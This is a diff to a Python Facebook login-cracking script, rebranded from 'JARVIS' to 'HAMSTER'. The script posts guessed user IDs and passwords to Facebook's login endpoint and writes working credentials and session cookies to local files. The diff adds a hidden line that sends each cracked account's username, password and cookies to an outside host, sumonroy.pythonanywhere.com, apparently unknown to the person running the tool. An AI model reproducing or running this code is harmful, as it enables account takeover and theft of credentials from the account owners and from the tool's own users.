@@ -1154,16 +1154,6 @@ def mobile(uid,pwx,tl):
             '__fmt': '0',
             '__a': '',
             '__user': '0',}
-            cookies = {
-            'ps_l': '1',
-            'ps_n': '1',
-            'sb': re.search('name="sb" value="(.*?)"', str(free_fb)).group(1),
-            'datr': re.search('name="datr" value="(.*?)"', str(free_fb)).group(1),
-            'dpr': '2.418783187866211',
-            'm_pixel_ratio': '2.200000047683716',
-            'wd': '491x968',
-            'fr': re.search('name="fr" value="(.*?)"', str(free_fb)).group(1),}
-            print(cookies)
             headers = {"authority": "www.facebook.com",
             "method": "POST",
             "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
@@ -1191,7 +1181,7 @@ def mobile(uid,pwx,tl):
             "user-agent": us,
             "viewport-width": "980"}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100'
+            url = 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
             po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             log_cookies = Session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
@@ -1207,24 +1197,21 @@ def mobile(uid,pwx,tl):
                 res = requests.get(ckk).text
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
-                        print('\033[1;92m [JARVIS-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
+                        print('\033[1;92m [HAMSTER-LGN] '+user+' | '+pw+'')
+                        print("\033[1;92m [\033[1;92mCOKI\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/HAMSTER/HMSTR-COOKIES.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                         oks.append(ids)
                         break
                     else:
-                        print('\033[1;92m [JARVIS-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/j4rvis/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
-                        open("/sdcard/j4rvis/uid.txt","a").write(user+"|"+pas+"\n")
-                        oks.append(ids)
+                        print(f"{red}(2F){user}")
+                        statusok = (f"{user}|{pw}|{coki}")
+                        requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         break
             elif "checkpoint" in log_cookies:
                 coki=(";").join([ "%s=%s" % (key, value) for key, value in response.cookies.get_dict().items()])
                 cid = coki[24:39]
-                #print('\033[1;91m [JARVIS-CP] '+ids+' | '+pas+'')
-                open('/sdcard/j4rvis/checkpoint.txt', 'a').write( ids+' | '+pas+'\n')
+                #print('\033[1;91m [HAMSTER-CP] '+ids+' | '+pas+'')
+                open('/sdcard/HAMSTER/CPS.txt', 'a').write( ids+' | '+pw+'\n')
                 cps.append(ids)
                 break
             else:continue
